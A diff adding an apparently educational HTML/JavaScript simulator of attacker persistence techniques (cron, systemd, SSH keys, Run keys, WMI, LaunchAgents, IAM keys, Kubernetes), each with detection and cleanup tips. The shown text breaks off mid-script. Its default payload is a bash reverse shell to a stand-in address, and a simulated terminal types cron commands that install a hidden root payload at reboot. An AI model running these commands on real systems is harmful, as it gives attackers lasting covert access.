@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Persistence Mechanisms — Linux/Windows/macOS/Cloud Foothold Simulator</title>
+<style>
+  :root{
+    --bg-a:#0a0e1a; --bg-b:#05070d; --panel:#070a14; --border:#1e293b;
+    --green:#22c55e; --green-lt:#4ade80; --cyan:#22d3ee; --amber:#f59e0b;
+    --red:#ef4444; --purple:#a855f7; --blue:#3b82f6;
+    --text:#cbd5e1; --muted:#64748b;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:'Courier New',ui-monospace,Menlo,monospace;
+    background:linear-gradient(160deg,var(--bg-a),var(--bg-b));
+    color:var(--text); display:flex; flex-direction:column;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+    opacity:.35;
+  }
+  header{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:8px 16px; border-bottom:1px solid var(--border);
+    background:rgba(7,10,20,.85); z-index:10;
+  }
+  header h1{ font-size:15px; letter-spacing:2px; color:var(--purple);
+    text-shadow:0 0 8px rgba(168,85,247,.5); }
+  header .sub{ font-size:10px; color:var(--muted); letter-spacing:1px; }
+  .header-actions{ display:flex; gap:8px; }
+  .header-actions button{
+    font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:5px 10px; border-radius:4px; cursor:pointer; transition:.15s;
+  }
+  .header-actions button:hover{ border-color:var(--purple); color:#d8b4fe; }
+  .header-actions button.active{
+    border-color:var(--purple); color:#d8b4fe;
+    box-shadow:0 0 10px rgba(168,85,247,.3);
+  }
+  .layout{ flex:1; display:flex; min-height:0; gap:1px; background:var(--border); }
+  .controls-pane{
+    width:340px; min-width:340px; background:var(--panel);
+    display:flex; flex-direction:column; overflow-y:auto; padding:10px; gap:10px;
+  }
+  .canvas-pane{ flex:1; position:relative; background:var(--panel); min-width:0; }
+  #stage{ display:block; width:100%; height:100%; }
+  .teaching-pane{
+    width:400px; min-width:400px; background:var(--panel);
+    display:flex; flex-direction:column; overflow:hidden;
+  }
+  .ctl-group{
+    border:1px solid var(--border); border-radius:5px;
+    background:#060912; padding:8px;
+  }
+  .ctl-group h3{
+    font-size:10px; letter-spacing:1.5px; color:var(--cyan);
+    margin-bottom:7px; text-transform:uppercase;
+  }
+  label.ctl-label{
+    display:block; font-size:10px; color:var(--muted); margin:6px 0 3px;
+  }
+  select,input[type=text],textarea{
+    width:100%; font-family:inherit; font-size:11px;
+    background:#0a0f1a; border:1px solid var(--border); color:var(--green-lt);
+    padding:5px 7px; border-radius:3px; outline:none;
+  }
+  select:focus,input:focus,textarea:focus{ border-color:var(--purple); }
+  textarea{ resize:vertical; min-height:52px; line-height:1.4; font-family:'Courier New',monospace; font-size:10px; }
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; background:#1e293b;
+    border-radius:2px; outline:none; margin:2px 0;
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:13px; height:13px; border-radius:50%;
+    background:var(--purple); cursor:pointer; box-shadow:0 0 7px rgba(168,85,247,.7);
+  }
+  input[type=range]::-moz-range-thumb{
+    width:13px; height:13px; border:none; border-radius:50%;
+    background:var(--purple); cursor:pointer;
+  }
+  .slider-row{ display:flex; justify-content:space-between; font-size:10px; color:var(--muted); }
+  .slider-val{ color:#d8b4fe; font-weight:bold; }
+  .btn-row{ display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+  button.act{
+    flex:1; min-width:70px; font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:7px 6px; border-radius:4px; cursor:pointer; transition:.15s;
+    text-transform:uppercase;
+  }
+  button.act:hover{ border-color:var(--purple); color:#d8b4fe; }
+  button.act.primary{
+    background:linear-gradient(180deg,#1a0f2a,#0a0612);
+    border-color:var(--purple); color:#d8b4fe;
+    box-shadow:0 0 10px rgba(168,85,247,.25);
+  }
+  button.act.primary:hover{ box-shadow:0 0 16px rgba(168,85,247,.5); }
+  button.act.danger{ border-color:var(--red); color:#fca5a5; }
+  button.act.warn{ border-color:var(--amber); color:#fcd34d; }
+  button.act.ok{ border-color:var(--green); color:var(--green-lt); }
+  button.act.ok:hover{ background:#0f2a18; }
+  button.act.pulse{ animation:pulsePurp 1.4s infinite; }
+  @keyframes pulsePurp{
+    0%,100%{ box-shadow:0 0 6px rgba(168,85,247,.3); }
+    50%{ box-shadow:0 0 18px rgba(168,85,247,.8); }
+  }
+  .term{
+    background:#0a0f0a; border:1px solid #14321a; border-radius:4px;
+    padding:7px; font-size:10px; line-height:1.45; color:var(--green-lt);
+    height:150px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+  }
+  .term::-webkit-scrollbar,.teaching-feed::-webkit-scrollbar,
+  .controls-pane::-webkit-scrollbar{ width:6px; }
+  .term::-webkit-scrollbar-thumb,.teaching-feed::-webkit-scrollbar-thumb,
+  .controls-pane::-webkit-scrollbar-thumb{ background:#1e293b; border-radius:3px; }
+  .term .prompt{ color:var(--green); }
+  .term .cursor{ display:inline-block; width:7px; height:12px; background:var(--green-lt);
+    animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .metrics-grid{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:5px;
+    padding:8px; border-bottom:1px solid var(--border);
+  }
+  .metric{
+    background:#060912; border:1px solid var(--border); border-radius:4px;
+    padding:5px 6px; text-align:center;
+  }
+  .metric .m-label{ font-size:8px; color:var(--muted); letter-spacing:.5px;
+    text-transform:uppercase; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .metric .m-value{ font-size:14px; font-weight:bold; color:var(--green-lt);
+    margin-top:2px; transition:color .2s; }
+  .metric.warn .m-value{ color:var(--amber); }
+  .metric.bad .m-value{ color:var(--red); }
+  .metric.purple .m-value{ color:#d8b4fe; }
+  .info-card{
+    padding:8px; border-bottom:1px solid var(--border); font-size:10px;
+    line-height:1.5; color:var(--muted);
+  }
+  .info-card b{ color:var(--cyan); }
+  .info-card .eq{ color:var(--green-lt); font-size:10px;
+    background:#060912; padding:3px 5px; border-radius:3px;
+    display:inline-block; margin:2px 0; }
+  .teaching-feed{
+    flex:1; overflow-y:auto; padding:6px 8px; display:flex;
+    flex-direction:column; gap:4px;
+  }
+  .feed-item{
+    font-size:10px; line-height:1.45; padding:5px 7px; border-radius:3px;
+    background:#060912; border-left:3px solid var(--blue);
+    animation:feedIn .25s ease-out; word-break:break-word;
+  }
+  @keyframes feedIn{ from{ opacity:0; transform:translateX(10px); } to{ opacity:1; transform:none; } }
+  .feed-item .tag{
+    font-size:8px; font-weight:bold; letter-spacing:1px;
+    padding:1px 5px; border-radius:2px; margin-right:5px; display:inline-block;
+  }
+  .feed-item.info{ border-left-color:var(--blue); }
+  .feed-item.info .tag{ background:rgba(59,130,246,.2); color:#93c5fd; }
+  .feed-item.ok{ border-left-color:var(--green); }
+  .feed-item.ok .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .feed-item.warn{ border-left-color:var(--amber); }
+  .feed-item.warn .tag{ background:rgba(245,158,11,.2); color:#fcd34d; }
+  .feed-item.error{ border-left-color:var(--red); }
+  .feed-item.error .tag{ background:rgba(239,68,68,.2); color:#fca5a5; }
+  .feed-item.concept{ border-left-color:var(--purple); }
+  .feed-item.concept .tag{ background:rgba(168,85,247,.2); color:#d8b4fe; }
+  .feed-item.ethics{ border-left-color:#fbbf24; background:#1a1506; }
+  .feed-item.ethics .tag{ background:rgba(251,191,36,.25); color:#fde68a; }
+  .feed-item.cmd{
+    border-left-color:var(--green); background:#0a0f0a; color:var(--green-lt);
+    font-family:'Courier New',monospace; white-space:pre-wrap;
+  }
+  .feed-item.cmd .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .ethics-banner{
+    position:absolute; top:8px; left:50%; transform:translateX(-50%);
+    background:rgba(120,53,15,.85); border:1px solid var(--amber);
+    color:#fde68a; font-size:9px; padding:4px 12px; border-radius:4px;
+    letter-spacing:.5px; z-index:5; white-space:nowrap;
+    box-shadow:0 0 14px rgba(245,158,11,.3);
+  }
+  .footer-overlay{
+    position:absolute; bottom:6px; left:50%; transform:translateX(-50%);
+    font-size:8px; color:var(--muted); letter-spacing:.5px; z-index:5; white-space:nowrap;
+  }
+  .status-badges{
+    position:absolute; top:38px; left:10px; z-index:5;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .status-badge{
+    font-size:9px; background:rgba(7,10,20,.85); border:1px solid var(--border);
+    padding:3px 8px; border-radius:3px; color:var(--muted); letter-spacing:.5px;
+  }
+  .status-badge b{ color:#d8b4fe; }
+  .status-badge.warn b{ color:var(--amber); }
+  .status-badge.bad b{ color:var(--red); }
+  .per-chain{
+    position:absolute; bottom:26px; left:10px; right:10px; z-index:5;
+    display:flex; gap:3px;
+  }
+  .per-phase{
+    flex:1; text-align:center; font-size:8px; letter-spacing:.5px;
+    padding:4px 2px; background:rgba(7,10,20,.8); border:1px solid var(--border);
+    border-radius:3px; color:var(--muted); transition:.2s;
+  }
+  .per-phase.done{ border-color:var(--purple); color:#d8b4fe;
+    background:rgba(168,85,247,.12); }
+  .per-phase.active{ border-color:var(--purple); color:#d8b4fe;
+    background:rgba(168,85,247,.2); box-shadow:0 0 10px rgba(168,85,247,.6);
+    animation:kcPurp 1.2s infinite; }
+  @keyframes kcPurp{ 50%{ box-shadow:0 0 16px rgba(168,85,247,.9); } }
+  .toast{
+    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(60px);
+    background:#0b1220; border:1px solid var(--green); color:var(--green-lt);
+    padding:8px 18px; border-radius:4px; font-size:11px; letter-spacing:1px;
+    opacity:0; transition:.3s; z-index:10000; pointer-events:none;
+    box-shadow:0 0 20px rgba(34,197,94,.3);
+  }
+  .toast.show{ transform:translateX(-50%) translateY(0); opacity:1; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>PERSISTENCE MECHANISMS</h1>
+    <span class="sub">T1547 · T1053 · T1543 · T1546 · T1136 · MITRE TA0003</span>
+  </div>
+  <div class="header-actions">
+    <button class="teaching-toggle active" id="teachingToggle">📖 TEACHING: ON</button>
+    <button class="voice-toggle" id="voiceToggle">VOICE: OFF</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="controls-pane">
+    <div class="ctl-group">
+      <h3>◆ Platform</h3>
+      <select id="platSelect">
+        <option value="linux">Linux (systemd/init)</option>
+        <option value="windows">Windows (registry/services)</option>
+        <option value="macos">macOS (launchd)</option>
+        <option value="cloud">Cloud (IAM/sts)</option>
+        <option value="container">Container (K8s/Docker)</option>
+      </select>
+      <label class="ctl-label">Technique (MITRE)</label>
+      <select id="techSelect">
+        <option value="cron">T1053.003 — Cron job (Linux)</option>
+        <option value="systemd">T1543.002 — Systemd service</option>
+        <option value="ssh">T1098.004 — SSH authorized_keys</option>
+        <option value="bashrc">T1546.004 — .bashrc/.profile</option>
+        <option value="registry">T1547.001 — Windows Run key</option>
+        <option value="service">T1543.003 — Windows Service</option>
+        <option value="wmi">T1546.003 — WMI Subscription</option>
+        <option value="scheduled">T1053.005 — Scheduled Task</option>
+        <option value="launchd">T1543.001 — Launch Agent (macOS)</option>
+        <option value="iam">T1098.001 — AWS IAM access key</option>
+        <option value="k8s">T1543 — K8s DaemonSet</option>
+        <option value="webhook">T1098 — Admission webhook</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Payload</h3>
+      <label class="ctl-label">Reverse shell / beacon</label>
+      <input type="text" id="payloadInput" value="bash -i >& /dev/tcp/203.0.113.66/4444 0>&1">
+      <label class="ctl-label">Trigger interval</label>
+      <select id="triggerSelect">
+        <option value="onboot">On system boot</option>
+        <option value="onlogin">On user login</option>
+        <option value="minute">Every minute (cron)</option>
+        <option value="hour">Every hour</option>
+        <option value="5min">Every 5 minutes</option>
+        <option value="idle">On user idle</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Stealth Level</h3>
+      <label class="ctl-label">Obfuscation <span class="slider-val" id="stealthVal">70%</span></label>
+      <input type="range" id="stealthSlider" min="0" max="100" value="70">
+      <label class="ctl-label">Persistence redundancy <span class="slider-val" id="redunVal">3</span></label>
+      <input type="range" id="redunSlider" min="1" max="5" value="3">
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Actions</h3>
+      <div class="btn-row">
+        <button type="button" class="act primary pulse" id="startBtn">▶ INSTALL</button>
+        <button type="button" class="act" id="stepBtn">⏭ STEP</button>
+        <button type="button" class="act danger" id="resetBtn">⟲ RESET</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act warn" id="detectBtn">🔍 DETECT</button>
+        <button type="button" class="act ok" id="huntBtn">🎯 HUNT</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Terminal</h3>
+      <div class="term" id="terminal">
+        <span class="prompt">attacker@target:~$ </span><span id="termContent"></span><span class="cursor"></span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="canvas-pane">
+    <canvas id="stage"></canvas>
+    <div class="ethics-banner">⚠ FOR EDUCATIONAL USE ONLY — Persistence mechanisms on unauthorized systems are federal crimes.</div>
+    <div class="status-badges">
+      <div class="status-badge">PLATFORM: <b id="badgePlat">LINUX</b></div>
+      <div class="status-badge">TECHNIQUE: <b id="badgeTech">CRON</b></div>
+      <div class="status-badge">STATUS: <b id="badgeStatus">IDLE</b></div>
+      <div class="status-badge">DETECTED: <b id="badgeDetected">NO</b></div>
+    </div>
+    <div class="per-chain" id="perChain">
+      <div class="per-phase" id="pp-STAGE">STAGE</div>
+      <div class="per-phase" id="pp-INSTALL">INSTALL</div>
+      <div class="per-phase" id="pp-CONCEAL">CONCEAL</div>
+      <div class="per-phase" id="pp-TRIGGER">TRIGGER</div>
+      <div class="per-phase" id="pp-SURVIVE">SURVIVE REBOOT</div>
+      <div class="per-phase" id="pp-OPERATE">OPERATE</div>
+    </div>
+    <div class="footer-overlay">MITRE ATT&CK TA0003 (Persistence) · T1547 · T1053 · T1543 · T1546 · T1098</div>
+  </main>
+
+  <aside class="teaching-pane">
+    <div class="metrics-grid">
+      <div class="metric purple" id="mMechs"><div class="m-label">Mechanisms</div><div class="m-value" id="mMechsVal">0</div></div>
+      <div class="metric" id="mRedundancy"><div class="m-label">Redundancy</div><div class="m-value" id="mRedundancyVal">0</div></div>
+      <div class="metric" id="mSurvival"><div class="m-label">Survival</div><div class="m-value" id="mSurvivalVal">0%</div></div>
+      <div class="metric" id="mStealth"><div class="m-label">Stealth</div><div class="m-value" id="mStealthVal">70%</div></div>
+      <div class="metric" id="mDetected"><div class="m-label">Detected</div><div class="m-value" id="mDetectedVal">NO</div></div>
+      <div class="metric" id="mIOCs"><div class="m-label">IOCs</div><div class="m-value" id="mIOCsVal">0</div></div>
+      <div class="metric" id="mTTL"><div class="m-label">Dwell TTL</div><div class="m-value" id="mTTLVal">—</div></div>
+      <div class="metric" id="mDefense"><div class="m-label">Defense</div><div class="m-value" id="mDefenseVal">OFF</div></div>
+    </div>
+    <div class="info-card">
+      <b>Persistence — maintain access across reboots/logouts.</b><br>
+      <span class="eq">Linux: cron, systemd, .bashrc, SSH keys, LKM</span><br>
+      <span class="eq">Windows: Run key, service, WMI subscription, scheduled task</span><br>
+      <span class="eq">macOS: LaunchAgent, LaunchDaemon, login items</span><br>
+      <span class="eq">Cloud: IAM access key, trust policy, role chaining</span><br>
+      <span style="color:var(--purple)">MITRE TA0003 · T1547 · T1053 · T1543 · T1136</span>
+    </div>
+    <div class="teaching-feed" id="teachingFeed"></div>
+  </aside>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+var STATE = {
+  running:false,
+  plat:'linux',
+  tech:'cron',
+  payload:'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1',
+  trigger:'onboot',
+  stealth:0.7,
+  redundancy:3,
+  mechs:0,
+  survival:0,
+  detected:false,
+  iocs:0,
+  ttl:'—',
+  phaseIdx:0,
+  tick:0,
+  lastTime:0,
+  events:[],
+  nodes:[],
+  feedCount:0
+};
+
+var PHASES = ['STAGE','INSTALL','CONCEAL','TRIGGER','SURVIVE','OPERATE'];
+
+var TECHNIQUES = {
+  cron:{
+    title:'T1053.003 — Cron job',
+    platform:'linux',
+    detail:'Add entry to /etc/crontab or /var/spool/cron/crontabs/<user>. Runs payload on schedule. Highly resilient — system reboots do not clear.',
+    detection:'FIM on /etc/crontab + /var/spool/cron. Auditd rule on file writes.',
+    cleanup:'rm entry from crontab; systemctl restart cron'
+  },
+  systemd:{
+    title:'T1543.002 — Systemd service',
+    platform:'linux',
+    detail:'Create /etc/systemd/system/xxx.service + enable. Starts on boot as root. Can be disguised with a legitimate-looking name.',
+    detection:'FIM on /etc/systemd/system. Check for unsigned ExecStart paths.',
+    cleanup:'systemctl disable xxx; rm unit file; systemctl daemon-reload'
+  },
+  ssh:{
+    title:'T1098.004 — SSH authorized_keys',
+    platform:'linux',
+    detail:'Append attacker public key to ~/.ssh/authorized_keys. Persistent shell access on every SSH login.',
+    detection:'FIM on authorized_keys. Alert on unfamiliar keys.',
+    cleanup:'Remove line from authorized_keys'
+  },
+  bashrc:{
+    title:'T1546.004 — .bashrc/.profile',
+    platform:'linux',
+    detail:'Append to shell rc file — executes on every interactive shell. Runs in user context, easy to miss.',
+    detection:'Hash your rc files. Alert on modifications.',
+    cleanup:'Remove line; compare against baseline'
+  },
+  registry:{
+    title:'T1547.001 — Windows Run key',
+    platform:'windows',
+    detail:'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater = "C:\\Users\\Public\\upd.exe". Runs on user login.',
+    detection:'Sysmon Event 13 (registry set). Autoruns (Sysinternals).',
+    cleanup:'reg delete the value'
+  },
+  service:{
+    title:'T1543.003 — Windows Service',
+    platform:'windows',
+    detail:'sc create / New-Service. Runs as SYSTEM on boot. Requires admin.',
+    detection:'Event 7045 (service install). Check for unquoted paths, odd binaries.',
+    cleanup:'sc delete xxx'
+  },
+  wmi:{
+    title:'T1546.003 — WMI Subscription',
+    platform:'windows',
+    detail:'Permanent WMI event subscription: __EventFilter + CommandLineEventConsumer. Fileless — no files on disk.',
+    detection:'Sysmon Event 19/20/21. Get-WmiObject -Namespace root\\subscription.',
+    cleanup:'Remove WMI subscription via PowerShell'
+  },
+  scheduled:{
+    title:'T1053.005 — Scheduled Task',
+    platform:'windows',
+    detail:'schtasks /create /tn "WindowsUpdate" /tr "..." /sc ONLOGON. Runs on event trigger. Often overlooked.',
+    detection:'Event 4698 (task created). Check XML for suspicious triggers.',
+    cleanup:'schtasks /delete /tn name /f'
+  },
+  launchd:{
+    title:'T1543.001 — Launch Agent',
+    platform:'macos',
+    detail:'~/Library/LaunchAgents/xxx.plist. Runs on user login. Or /Library/LaunchDaemons for system-wide (root).',
+    detection:'FIM on LaunchAgents + LaunchDaemons. Check plist signature.',
+    cleanup:'launchctl unload; rm plist'
+  },
+  iam:{
+    title:'T1098.001 — AWS IAM access key',
+    platform:'cloud',
+    detail:'CreateAccessKey for existing user (or new user via compromised role). Keys persist until deleted. Often overlooked in cloud incident response.',
+    detection:'CloudTrail: CreateAccessKey + CreateUser events. Alert on IAM changes.',
+    cleanup:'aws iam delete-access-key; aws iam delete-user'
+  },
+  k8s:{
+    title:'T1543 — K8s DaemonSet',
+    platform:'container',
+    detail:'Deploy privileged DaemonSet — auto-respawns on every node. Or create ClusterRoleBinding for a backdoor SA.',
+    detection:'Kubernetes audit logs (pod create, clusterrolebinding). Admission policies.',
+    cleanup:'kubectl delete daemonset; kubectl delete clusterrolebinding'
+  },
+  webhook:{
+    title:'T1098 — Admission webhook',
+    platform:'container',
+    detail:'Register a MutatingAdmissionWebhook that injects a sidecar into every pod. Persists across pod restarts and new deployments.',
+    detection:'Audit for ValidatingWebhookConfiguration / MutatingWebhookConfiguration.',
+    cleanup:'kubectl delete mutatingwebhookconfiguration xxx'
+  }
+};
+
+var canvas = document.getElementById('stage');
+var ctx = canvas.getContext('2d');
+var terminalContent = document.getElementById('termContent');
+var teachingFeed = document.getElementById('teachingFeed');
+
+function resizeCanvas(){
+  var pane = canvas.parentElement;
+  canvas.width = pane.clientWidth;
+  canvas.height = pane.clientHeight;
+  buildTopology();
+}
+window.addEventListener('resize', resizeCanvas);
+
+function buildTopology(){
+  var W = canvas.width, H = canvas.height;
+  STATE.nodes = [
+    {id:'attacker', label:'attacker', ip:'203.0.113.66', x:0.10*W, y:0.40*H, icon:'attacker', color:'#ef4444', glow:0, blink:0},
+    {id:'target', label:'target host', ip:'10.0.0.50', x:0.35*W, y:0.40*H, icon:'laptop', color:'#3b82f6', glow:0, blink:0},
+    {id:'persist', label:'persistence', ip:TECHNIQUES[STATE.tech].title.split(' ')[0], x:0.55*W, y:0.20*H, icon:'server', color:'#a855f7', glow:0, blink:0},
+    {id:'c2', label:'C2 server', ip:'203.0.113.66:4444', x:0.55*W, y:0.60*H, icon:'cloud', color:'#ef4444', glow:0, blink:0},
+    {id:'boot', label:'boot / login', ip:'event trigger', x:0.75*W, y:0.20*H, icon:'server', color:'#fcd34d', glow:0, blink:0},
+    {id:'siem', label:'SIEM/EDR', ip:'detection', x:0.85*W, y:0.60*H, icon:'server', color:'#22c55e', glow:0, blink:0}
+  ];
+}
+
+function drawIcon(type, x, y, color, glow, blink, label, ip){
+  ctx.save();
+  ctx.translate(x, y);
+  if(glow > 0){
+    var g = ctx.createRadialGradient(0,0,2,0,0,42);
+    g.addColorStop(0, 'rgba(168,85,247,'+(glow*0.55)+')');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = g;
+    ctx.beginPath(); ctx.arc(0,0,42,0,Math.PI*2); ctx.fill();
+  }
+  ctx.strokeStyle = color; ctx.fillStyle = color;
+  ctx.lineWidth = 1.4;
+  ctx.shadowColor = color; ctx.shadowBlur = glow > 0 ? 8 : 0;
+
+  switch(type){
+    case 'server': {
+      ctx.strokeRect(-11,-16,22,32);
+      for(var i=0;i<5;i++){
+        var yy = -14 + i*6;
+        ctx.strokeRect(-9,yy,18,4.5);
+        ctx.fillStyle = blink%2===0 ? '#22c55e' : '#166534';
+        ctx.beginPath(); ctx.arc(7,yy+2.2,1.3,0,Math.PI*2); ctx.fill();
+        ctx.fillStyle = color;
+      }
+      break;
+    }
+    case 'laptop': {
+      ctx.strokeRect(-14,-12,28,18);
+      ctx.fillStyle = 'rgba(59,130,246,.15)';
+      ctx.fillRect(-13,-11,26,16);
+      ctx.strokeStyle = '#93c5fd'; ctx.lineWidth = 0.7;
+      for(var j=0;j<3;j++){ ctx.beginPath(); ctx.moveTo(-10,-8+j*4); ctx.lineTo(8,-8+j*4); ctx.stroke(); }
+      ctx.strokeStyle = color; ctx.lineWidth = 1.4;
+      ctx.beginPath(); ctx.moveTo(-16,6); ctx.lineTo(16,6); ctx.lineTo(14,9); ctx.lineTo(-14,9); ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'cloud': {
+      ctx.beginPath();
+      ctx.arc(-8,0,8,Math.PI*0.5,Math.PI*1.5);
+      ctx.arc(0,-4,10,Math.PI,Math.PI*2);
+      ctx.arc(10,0,8,Math.PI*1.5,Math.PI*0.5);
+      ctx.lineTo(10,6); ctx.lineTo(-8,6);
+      ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'attacker': {
+      ctx.beginPath();
+      ctx.arc(0,-6,7,Math.PI,0);
+      ctx.lineTo(8,8); ctx.lineTo(-8,8); ctx.closePath();
+      ctx.fillStyle = 'rgba(239,68,68,.3)'; ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#ef4444';
+      ctx.beginPath(); ctx.arc(-2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      ctx.beginPath(); ctx.arc(2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      break;
+    }
+  }
+  ctx.restore();
+  ctx.save();
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = color;
+  ctx.fillText(label, x, y + 30);
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = '#64748b';
+  ctx.fillText(ip, x, y + 40);
+  ctx.restore();
+}
+
+function spawnPacket(fromId, toId, color, label, speed){
+  var from = STATE.nodes.find(function(n){return n.id===fromId;});
+  var to = STATE.nodes.find(function(n){return n.id===toId;});
+  if(!from || !to) return;
+  STATE.events.push({type:'packet', from:{x:from.x,y:from.y}, to:{x:to.x,y:to.y},
+    t:0, speed:speed||0.02, color:color, label:label, size:4});
+}
+
+function escapeHtml(s){
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+function addFeed(tag, text, type){
+  type = type || 'info';
+  var div = document.createElement('div');
+  div.className = 'feed-item ' + type;
+  var time = new Date().toLocaleTimeString('en-US',{hour12:false});
+  div.innerHTML = '<span class="tag">' + escapeHtml(tag) + '</span> ' +
+    '<span style="color:#475569">[' + time + ']</span> ' + escapeHtml(text);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  STATE.feedCount++;
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+  speak(text);
+}
+function addCommandFeed(cmd, output){
+  var div = document.createElement('div');
+  div.className = 'feed-item cmd';
+  div.innerHTML = '<span class="tag">CMD</span><br>' +
+    '<span style="color:#4ade80">attacker@target:~$ </span>' +
+    escapeHtml(cmd) + '\n' + escapeHtml(output);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+}
+
+var termQueue = []; var termTyping = false;
+function termWrite(text, callback){
+  termQueue.push({text:text, callback:callback});
+  if(!termTyping) processTermQueue();
+}
+function processTermQueue(){
+  if(termQueue.length === 0){ termTyping = false; return; }
+  termTyping = true;
+  var item = termQueue.shift();
+  var i = 0; var text = item.text;
+  terminalContent.textContent = '';
+  var interval = setInterval(function(){
+    if(i < text.length){ terminalContent.textContent += text[i]; i++; }
+    else { clearInterval(interval); termTyping = false; if(item.callback) item.callback(); setTimeout(processTermQueue, 100); }
+  }, 10);
+}
+
+var VOICE = { enabled:false, queue:[], lastSpoken:{}, speaking:false, synth:window.speechSynthesis };
+function speak(text){
+  if(!VOICE.enabled || !VOICE.synth) return;
+  var now = Date.now();
+  if(VOICE.lastSpoken[text] && now - VOICE.lastSpoken[text] < 4000) return;
+  VOICE.lastSpoken[text] = now;
+  if(VOICE.queue.length >= 4) VOICE.queue.shift();
+  VOICE.queue.push(text);
+  if(!VOICE.speaking) processVoiceQueue();
+}
+function processVoiceQueue(){
+  if(VOICE.queue.length === 0){ VOICE.speaking = false; return; }
+  VOICE.speaking = true;
+  var text = VOICE.queue.shift();
+  var utter = new SpeechSynthesisUtterance(text);
+  utter.rate = 1.05; utter.pitch = 1.0;
+  var voices = VOICE.synth.getVoices();
+  var pref = voices.find(function(v){return v.lang && v.lang.startsWith('en-US');}) || voices[0];
+  if(pref) utter.voice = pref;
+  utter.onend = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  utter.onerror = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  VOICE.synth.speak(utter);
+}
+
+function boot(){
+  resizeCanvas();
+  addFeed('ETHICS',
+    'Persistence is how attackers maintain access long-term. It is CRITICAL for defenders to understand because persistence mechanisms are among the hardest to fully remove. Studying them is legal in your own lab (VMs, containers). Deploying persistence on systems you do not own — even to "test" — is a felony under CFAA/CMA. If you find persistence in a client environment during authorized work, DOCUMENT EVERYTHING before removal (timestamps, hashes, configs) — you may destroy evidence. In incident response, the standard is: identify, document, contain, then eradicate — not the reverse.',
+    'ethics');
+  setTimeout(function(){
+    addFeed('CONCEPT',
+      'Persistence (MITRE TA0003) is the set of techniques an attacker uses to maintain access across reboots, logouts, and password changes. Modern attackers use MULTIPLE redundant mechanisms — if defenders find and remove one, another survives. Categories: Scheduled Task/Job (T1053), Boot or Logon Autostart (T1547), Create Account (T1136), Account Manipulation (T1098), Server Software Component (T1505), Hijack Execution Flow (T1574). Detection requires FIM (file integrity monitoring), registry monitoring, ETW/Sysmon on Windows, auditd on Linux, Kubernetes audit logs on containers. Prevention: application allowlisting, least privilege, secure boot, immutable infrastructure, EDR with behavior detection.',
+      'concept');
+  }, 800);
+  setTimeout(function(){
+    termWrite('echo "' + STATE.payload + '" > /tmp/.payload.sh\n' +
+      'chmod +x /tmp/.payload.sh\n' +
+      'echo "@reboot root /tmp/.payload.sh" >> /etc/crontab\n' +
+      '[+] Persistence installed');
+  }, 1600);
+  setTimeout(function(){
+    addFeed('INFO',
+      'Platform: ' + STATE.plat.toUpperCase() + '. Technique: ' + TECHNIQUES[STATE.tech].title + '. Click INSTALL to deploy persistence.',
+      'info');
+    updateBadges();
+  }, 2400);
+  requestAnimationFrame(loop);
+}
+
+function loop(ts){
+  var dt = STATE.lastTime ? (ts - STATE.lastTime) : 16;
+  STATE.lastTime = ts;
+  STATE.tick++;
+  STATE.nodes.forEach(function(n){ n.blink = Math.floor(STATE.tick / 20); });
+
+  for(var i = STATE.events.length - 1; i >= 0; i--){
+    var e = STATE.events[i];
+    if(e.type === 'packet'){
+      e.t += e.speed * (dt/16);
